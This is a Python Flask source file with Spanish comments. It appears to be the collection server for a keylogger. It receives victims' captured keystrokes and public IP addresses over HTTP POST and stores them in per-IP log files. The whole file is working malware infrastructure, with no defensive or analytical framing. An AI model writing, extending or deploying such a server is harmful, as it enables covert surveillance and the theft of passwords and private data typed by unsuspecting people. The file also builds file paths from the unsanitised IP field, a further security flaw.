from flask import Flask, request
import os
from dotenv import load_dotenv

app = Flask(__name__)

# Cargar las variables de entorno desde el archivo .env
load_dotenv()

# Directorio donde se guardarán los archivos
LOG_DIR = 'keylogs'

# Asegurarse de que el directorio exista
if not os.path.exists(LOG_DIR):
    os.makedirs(LOG_DIR)

# Leer el puerto desde la variable de entorno 'PORT'
def get_port():
    try:
        port = os.getenv('PORT', 5000)  # Valor por defecto 5000 si no se encuentra la variable de entorno
        return int(port) if port.isdigit() else 5000  # Validación adicional si no es un número
    except Exception as e:
        return 5000  # Valor por defecto si hay algún error

@app.route('/upload_log', methods=['POST'])
def upload_log():
    """
    Recibe un log y la IP pública desde el keylogger y la usa para guardar el archivo.
    """
    try:
        user_ip = request.form.get('ip')  # Obtener la IP pública enviada por el keylogger
        user_log = request.form.get('log')  # Obtener los datos del log

        if not user_ip or not user_log:
            return "No se recibieron datos del log o la IP.", 400

        # Guardar el log en el archivo correspondiente
        log_file = os.path.join(LOG_DIR, f"{user_ip}.txt")
        with open(log_file, 'a', encoding='utf-8') as f:
            f.write(user_log + '\n')  # Añadir salto de línea

        return "Log recibido y guardado.", 200

    except Exception as e:
        return f"Error al procesar el log: {str(e)}", 500

if __name__ == '__main__':
    port = get_port()  # Obtener el puerto desde la variable de entorno 'PORT'
    app.run(host='0.0.0.0', port=port)